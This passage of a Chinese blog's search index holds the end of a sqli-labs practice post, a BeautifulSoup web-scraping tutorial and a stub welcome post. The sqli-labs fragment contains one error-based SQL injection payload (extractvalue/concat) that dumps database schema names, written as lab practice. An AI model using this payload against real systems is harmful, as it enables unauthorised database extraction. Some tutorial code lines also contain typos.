alt="img"></p><p>报错注入</p><p>1’ and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)))</p><p><img src="https://s1.ax1x.com/2020/08/17/dn9eXQ.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql-libs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bs4help(1)</title>
    <link href="/2020/08/17/bs4help/"/>
    <url>/2020/08/17/bs4help/</url>
    
    <content type="html"><![CDATA[<p>BeautifulSoup系列文章</p><span id="more"></span><h2 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h2><h2 id="获取网页"><a href="#获取网页" class="headerlink" title="获取网页"></a>获取网页</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> requests<br><span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.get(<span class="hljs-string">&quot;http://python123.io/ws/demo.html&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>使用BeautifulSoup处理网页</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup =  BeautifulSoup(r.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(soup.prettify())<br></code></pre></div></td></tr></table></figure><p>处理后的网页</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><br>   This is a python demo page<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span><br>    The demo python introduces several python courses.<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;course&quot;</span>&gt;</span><br>   Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:<br>   <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;py1&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;link1&quot;</span>&gt;</span><br>    Basic Python<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>   and<br>   <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;py2&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;link2&quot;</span>&gt;</span><br>    Advanced Python<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>   .<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h2><p>使用tag标签提取网页内容</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.title<br>&lt;title&gt;This is a python demo page&lt;/title&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.p<br>&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.a<br>&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt;<br><br></code></pre></div></td></tr></table></figure><blockquote><p>当HTML文档中存在多个相同<tag>对应内容时，soup.<tag>返回第一个</p></blockquote><h3 id="Tag的name"><a href="#Tag的name" class="headerlink" title="Tag的name"></a>Tag的name</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.a.name<br><span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.a.parent.name<br><span class="hljs-string">&#x27;p&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>每个<tag>都有自己的名字，通过<tag>.name获取，字符串类型</p></blockquote><h3 id="tag的attrs-属性"><a href="#tag的attrs-属性" class="headerlink" title="tag的attrs(属性)"></a>tag的attrs(属性)</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.a.attrs<br>&#123;<span class="hljs-string">&#x27;href&#x27;</span>: <span class="hljs-string">&#x27;http://www.icourse163.org/course/BIT-268001&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>: [<span class="hljs-string">&#x27;py1&#x27;</span>], <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;link1&#x27;</span>&#125;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.a.attrs[<span class="hljs-string">&#x27;class&#x27;</span>]<br>[<span class="hljs-string">&#x27;py1&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(soup.a.attrs)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">dict</span>&#x27;&gt;</span><br><span class="hljs-class">&gt;&gt;&gt; <span class="hljs-title">type</span>(<span class="hljs-params">soup.a.attrs[<span class="hljs-string">&#x27;class&#x27;</span>]</span>)</span><br><span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">list</span>&#x27;&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="Tag的NavigableString"><a href="#Tag的NavigableString" class="headerlink" title="Tag的NavigableString"></a>Tag的NavigableString</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.a.string<br><span class="hljs-string">&#x27;Basic Python&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.p.srting<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.p<br>&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.p.text<br><span class="hljs-string">&#x27;The demo python introduces several python courses.&#x27;</span><br></code></pre></div></td></tr></table></figure><blockquote><p>string输出当前标签的tring，而text输出标签内存在的文本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.b<br>&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.b.string<br><span class="hljs-string">&#x27;The demo python introduces several python courses.&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.b.text<br><span class="hljs-string">&#x27;The demo python introduces several python courses.&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(soup.b.string)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">bs4</span>.<span class="hljs-title">element</span>.<span class="hljs-title">NavigableString</span>&#x27;&gt;</span><br><span class="hljs-class">&gt;&gt;&gt; <span class="hljs-title">type</span>(<span class="hljs-params">soup.b.text</span>)</span><br><span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">str</span>&#x27;&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="tag的Comment"><a href="#tag的Comment" class="headerlink" title="tag的Comment"></a>tag的Comment</h3><blockquote><p>标签内字符串的注释部分，一种特殊的Comment类型</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>newsoup = BeautifulSoup(<span class="hljs-string">&quot;&lt;b&gt;&lt;!--a comment--&gt;&lt;/b&gt;&lt;p&gt;not a comment&lt;/p&gt;&quot;</span>,<span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>newsoup.b.string<br><span class="hljs-string">&#x27;a comment&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>newsoup.p.string<br><span class="hljs-string">&#x27;not a comment&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(newsoup.b.string)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">bs4</span>.<span class="hljs-title">element</span>.<span class="hljs-title">Comment</span>&#x27;&gt;</span><br><span class="hljs-class">&gt;&gt;&gt; <span class="hljs-title">type</span>(<span class="hljs-params">newsoup.p.string</span>)</span><br><span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">bs4</span>.<span class="hljs-title">element</span>.<span class="hljs-title">NavigableString</span>&#x27;&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="基于bs4库的HTML内容遍历方法"><a href="#基于bs4库的HTML内容遍历方法" class="headerlink" title="基于bs4库的HTML内容遍历方法"></a>基于bs4库的HTML内容遍历方法</h2><p><img src="https://i.loli.net/2020/08/17/1qPGYCoTjWAn4pt.png" alt="image-20200817180535262"></p><h2 id="下行遍历"><a href="#下行遍历" class="headerlink" title="下行遍历"></a>下行遍历</h2><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.contents</td><td align="center">子节点的列表，将<tag>所有儿子节点存入列表</td></tr><tr><td align="center">.children</td><td align="center">子节点的迭代类型，与.contents类似，用于循环遍历儿子节点</td></tr><tr><td align="center">.descendants</td><td align="center">子孙节点的迭代类型，包含所有子孙节点，用于循环遍历</td></tr></tbody></table><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.head<br>&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.head.contents<br>[&lt;title&gt;This is a python demo page&lt;/title&gt;]<br></code></pre></div></td></tr></table></figure><h3 id="遍历儿子节点"><a href="#遍历儿子节点" class="headerlink" title="遍历儿子节点"></a>遍历儿子节点</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> soup.body.children:<br><span class="hljs-built_in">print</span>(child)<br></code></pre></div></td></tr></table></figure><h3 id="遍历子孙节点"><a href="#遍历子孙节点" class="headerlink" title="遍历子孙节点"></a>遍历子孙节点</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> soup.body.descendants:<br><span class="hljs-built_in">print</span>(child)<br></code></pre></div></td></tr></table></figure><h2 id="上行遍历"><a href="#上行遍历" class="headerlink" title="上行遍历"></a>上行遍历</h2><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.parent</td><td align="center">节点的父亲节点</td></tr><tr><td align="center">.parents</td><td align="center">节点先辈标签的迭代类型，用于循环遍历先辈节点</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.title.parent<br>&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.head.parent<br>&lt;html&gt;&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;<br>&lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:<br><br>&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;<br>&lt;/body&gt;&lt;/html&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(soup.parent)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">NoneType</span>&#x27;&gt;</span><br></code></pre></div></td></tr></table></figure><p>遍历所有先辈节点，包括soup本身，所以要区别判断</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> parent <span class="hljs-keyword">in</span> soup.a.parents:<br><span class="hljs-keyword">if</span> parent <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-built_in">print</span>(parent)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(parent.name)<br><br><br>p<br>body<br>html<br>[document]<br></code></pre></div></td></tr></table></figure><h2 id="平行遍历"><a href="#平行遍历" class="headerlink" title="平行遍历"></a>平行遍历</h2><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">.next_sibling</td><td align="center">返回按照HTML文本顺序的下一个平行节点标签</td></tr><tr><td align="center">.previous_sibling</td><td align="center">返回按照HTML文本顺序的上一个平行节点标签</td></tr><tr><td align="center">.next_siblings</td><td align="center">迭代类型，返回按照HTML文本顺序的后续所有平行节点标签</td></tr><tr><td align="center">.previous_siblings</td><td align="center">迭代类型，返回按照HTML文本顺序的前续所有平行节点标签</td></tr></tbody></table><h3 id="遍历后续节点"><a href="#遍历后续节点" class="headerlink" title="遍历后续节点"></a>遍历后续节点</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> subling <span class="hljs-keyword">in</span> soup.a.next_sibling:<br><span class="hljs-built_in">print</span>(sibling)<br></code></pre></div></td></tr></table></figure><h3 id="遍历前续节点"><a href="#遍历前续节点" class="headerlink" title="遍历前续节点"></a>遍历前续节点</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">for</span> sibling <span class="hljs-keyword">in</span> soup.a.previous_sibling:<br><span class="hljs-built_in">print</span>(sibling)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BeautifulSoup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello Word</title>
    <link href="/2019/01/01/Hello-Word/"/>
    <url>/2019/01/01/Hello-Word/</url>
    
    <content type="html"><![CDATA[<p>目标：博客园文章迁移</p><span id="more"></span>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
